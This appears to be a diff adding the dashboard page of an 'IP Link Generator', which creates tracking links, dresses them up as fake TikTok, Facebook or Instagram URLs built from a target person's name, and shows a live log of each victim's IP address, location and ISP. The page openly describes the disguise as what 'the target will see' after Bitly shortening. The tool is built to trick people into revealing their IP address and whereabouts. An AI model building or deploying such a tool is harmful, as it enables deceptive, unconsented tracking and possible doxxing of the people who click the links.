@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Tracker | Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="supabase_config.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0c;
+            --card: #16161a;
+            --accent: #3b82f6;
+            --text: #f8fafc;
+            --text-dim: #94a3b8;
+            --border: #27272a;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #3b82f6, #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        p.subtitle {
+            color: var(--text-dim);
+            margin-bottom: 40px;
+        }
+
+        /* Generator Section */
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .form-group {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            flex: 1;
+            background: #000;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px 16px;
+            color: #fff;
+            font-family: inherit;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: var(--accent);
+        }
+
+        button {
+            background: var(--accent);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        .result-box {
+            background: #000;
+            border: 1px dashed var(--border);
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            word-break: break-all;
+            margin-top: 20px;
+        }
+
+        .result-box code {
+            color: #10b981;
+            font-family: monospace;
+        }
+
+        .template-btn {
+            background: #27272a;
+            color: var(--text-dim);
+            border: 1px solid var(--border);
+            padding: 8px 16px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-radius: 6px;
+        }
+
+        .template-btn:hover {
+            border-color: var(--accent);
+            color: white;
+            background: #3f3f46;
+        }
+
+        /* Logs Table */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th {
+            text-align: left;
+            color: var(--text-dim);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            padding: 12px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        td {
+            padding: 12px;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.9rem;
+        }
+
+        tr:hover {
+            background: rgba(255,255,255,0.02);
+        }
+
+        .badge {
+            background: #27272a;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+        }
+
+        .refresh-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-dim);
+            font-size: 0.8rem;
+            padding: 6px 12px;
+            margin-bottom: 10px;
+            float: right;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>IP Link Generator</h1>
+        <p class="subtitle">Create a tracking link, shorten it with Bitly, and watch the logs.</p>
+
+        <div class="card">
+            <h3>Generate New Link</h3>
+            
+            <p style="font-size: 0.8rem; color: var(--text-dim); margin-bottom: 10px;">Quick Templates:</p>
+            <div class="form-group" style="flex-wrap: wrap; margin-bottom: 25px;">
+                <button class="template-btn" onclick="useTemplate('TikTok', 'https://www.tiktok.com/trending')">TikTok</button>
+                <button class="template-btn" onclick="useTemplate('Facebook', 'https://www.facebook.com/watch')">Facebook</button>
+                <button class="template-btn" onclick="useTemplate('Instagram', 'https://www.instagram.com/reels')">Instagram</button>
+                <button class="template-btn" onclick="useTemplate('Google', 'https://www.google.com/search?q=trending')">Google</button>
+            </div>
+
+            <div class="form-group">
+                <input type="text" id="targetUrl" placeholder="Target URL (e.g. https://google.com)">
+                <input type="text" id="linkName" placeholder="Link Name (e.g. Test 1)">
+                <button onclick="generateLink()">Generate</button>
+            </div>
+            <div id="resultBox" class="result-box">
+                <div style="margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid #333;">
+                    <p style="margin:0 0 5px 0; font-size: 0.75rem; color: #10b981; font-weight: bold; text-transform: uppercase;">✨ Convincing Link Preview:</p>
+                    <span id="fakeLink" style="font-size: 1.1rem; color: #fff; font-weight: 600;"></span>
+                    <p style="margin:5px 0 0 0; font-size: 0.7rem; color: var(--text-dim);">This is what the target will see after you use Bitly.</p>
+                </div>
+
+                <p style="margin:0 0 10px 0; font-size: 0.75rem; color: var(--text-dim); font-weight: bold; text-transform: uppercase;">🔗 Technical Tracker Link (Paste this into Bitly):</p>
+                <code id="generatedLink" style="font-size: 0.8rem; opacity: 0.8;"></code>
+                <button style="margin-left:10px; padding: 6px 12px; font-size: 0.7rem;" onclick="copyLink()">Copy Tracker</button>
+            </div>
+        </div>
+
+        <div style="overflow: hidden;">
+            <button class="refresh-btn" onclick="fetchLogs()">Refresh Logs</button>
+            <h3>Live Logs</h3>
+        </div>
+        
+        <div class="card" style="padding: 0;">
+            <div style="overflow-x: auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Time</th>
+                            <th>IP Address</th>
+                            <th>Location</th>
+                            <th>ISP</th>
+                            <th>Link Name</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logsTableBody">
+                        <!-- Logs will appear here -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function useTemplate(name, url) {
+            document.getElementById('targetUrl').value = url;
+            document.getElementById('linkName').value = name;
+        }
+
+        function generateLink() {
+            const target = document.getElementById('targetUrl').value;
+            const name = document.getElementById('linkName').value;
+            if (!target) return alert('Please enter a target URL');
+
+            // Format name for the fake link (e.g. "Brill Morales" -> "brill-morales")
+            const formattedName = name.toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, '');
+            
+            // 1. The Real Tracker Link
+            const baseUrl = window.location.href.replace('index.html', 'logger.html');
+            const finalLink = `${baseUrl}?target=${encodeURIComponent(target)}&name=${encodeURIComponent(name)}`;
+            
+            // 2. The Convincing Preview
+            let domain = "tiktok.com";
+            if (target.includes("facebook")) domain = "facebook.com/watch";
+            if (target.includes("instagram")) domain = "instagram.com/reels";
+            
+            document.getElementById('fakeLink').innerText = `https://www.${domain}/${formattedName}`;
+            document.getElementById('generatedLink').innerText = finalLink;
+            document.getElementById('resultBox').style.display = 'block';
+        }
+
+        function copyLink() {
+            const link = document.getElementById('generatedLink').innerText;
+            navigator.clipboard.writeText(link);
+            alert('Copied to clipboard!');
+        }
+
+        async function fetchLogs() {
+            const { data, error } = await window.supabaseClient
+                .from('ip_logs')
+                .select('*')
+                .order('created_at', { ascending: false });
+
+            if (error) {
+                console.error(error);
+                return;
+            }
+
+            const tbody = document.getElementById('logsTableBody');
+            tbody.innerHTML = '';
+
+            data.forEach(log => {
+                const row = document.createElement('tr');
+                const time = new Date(log.created_at).toLocaleTimeString();
+                row.innerHTML = `
+                    <td>${time}</td>
+                    <td><span class="badge">${log.ip_address}</span></td>
+                    <td>${log.city || 'Unknown'}, ${log.country || 'Unknown'}</td>
+                    <td style="color: var(--text-dim); font-size: 0.8rem;">${log.org || 'Unknown'}</td>
+                    <td>${log.link_name}</td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        // Initial fetch
+        fetchLogs();
+        // Auto refresh every 10 seconds
+        setInterval(fetchLogs, 10000);
+    </script>
+</body>
+</html>
